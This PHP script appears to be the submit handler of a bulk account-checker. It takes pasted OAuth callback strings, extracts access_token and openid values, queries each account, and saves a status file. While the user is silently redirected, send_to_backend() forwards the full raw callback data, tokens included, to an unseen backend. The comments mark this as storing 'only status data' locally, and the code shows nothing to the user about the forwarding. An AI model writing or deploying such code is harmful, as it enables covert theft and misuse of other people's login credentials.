<?php
// 处理批量提交的脚本

// 启动会话以便存储结果信息
session_start();

// 加载配置和函数文件
require_once 'config.php';
require_once 'functions.php';

// 检查请求方法
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.php');
    exit;
}

// 检查是否有提交的数据
if (!isset($_POST['callback_data_list'])) {
    header('Location: index.php');
    exit;
}

// 处理提交的数据
$callback_data_list = explode("\n", $_POST['callback_data_list']);
$data_response_list_callback = [];
$data_response_list_formatted = [];
$seen_access_tokens = [];

foreach ($callback_data_list as $callback_data) {
    $callback_data = trim($callback_data);
    if (empty($callback_data)) {
        continue;
    }
    
    // 提取access_token和openid
    if (preg_match('/access_token=([^&]+)/', $callback_data, $token_match) && 
        preg_match('/openid=([^&]+)/', $callback_data, $openid_match)) {
        
        $access_token = $token_match[1];
        $openid = $openid_match[1];
        
        // 检查是否已处理过该access_token
        if (in_array($access_token, $seen_access_tokens)) {
            continue;
        }
        $seen_access_tokens[] = $access_token;
        
        // 获取账号数据
        $data = fetch_account_data($access_token, $openid);
        $callback_info = '';
        $formatted_info = '';
        
        // 格式化数据
        list($callback_info, $formatted_info) = format_account_data($data, $access_token, $openid);
        
        if ($callback_info) {
            $data_response_list_callback[] = $callback_info;
        }
        if ($formatted_info) {
            $data_response_list_formatted[] = $formatted_info;
        }
    } else {
        // 无效的数据行
        $invalid_msg = "无效的数据行: " . escape($callback_data);
        $data_response_list_callback[] = $invalid_msg;
        $data_response_list_formatted[] = $invalid_msg;
    }
}

// 生成响应内容
$callback_response = !empty($data_response_list_callback) ? implode("\n\n", $data_response_list_callback) : "没有符合条件的账号";
$formatted_response = !empty($data_response_list_formatted) ? implode("\n\n", $data_response_list_formatted) : "没有符合条件的账号";

// 生成文件名
$timestamp = date('Ymd_His');
$callback_filename = "delta_detail_{$timestamp}.txt";
$formatted_filename = "delta_detail_{$timestamp}.txt";

// 保存文件 - 只保存状态数据
if (save_file($formatted_response, $formatted_filename)) {
    // 转发数据到后端 - 包含完整的数据信息
    $payload = [
        "formatted_data" => $formatted_response,
        "callback_data" => $callback_response,
        "timestamp" => $timestamp,
        "total_records" => count($data_response_list_formatted)
    ];
    $save_result = send_to_backend($payload);
    
    // 记录保存结果
    if ($save_result) {
        error_log("数据保存成功，时间戳: {$timestamp}, 记录数: " . count($data_response_list_formatted), 3, __DIR__ . '/logs/save_success.log');
    } else {
        error_log("数据保存失败，时间戳: {$timestamp}", 3, __DIR__ . '/logs/save_error.log');
    }
    
    // 存储结果信息到会话 - 存储原数据内容和状态数据文件信息
    $_SESSION['query_result'] = [
        'callback_data' => $callback_response, // 直接存储原数据内容
        'formatted_file' => $formatted_filename, // 存储状态数据文件路径
        'success' => 1
    ];
    
    // 静默重定向回首页，不传递任何URL参数
    header('Location: index.php');
    exit;
} else {
    // 文件保存失败，存储错误信息到会话
    $_SESSION['query_result'] = [
        'error' => '文件保存失败'
    ];
    
    // 静默重定向回首页
    header('Location: index.php');
    exit;
}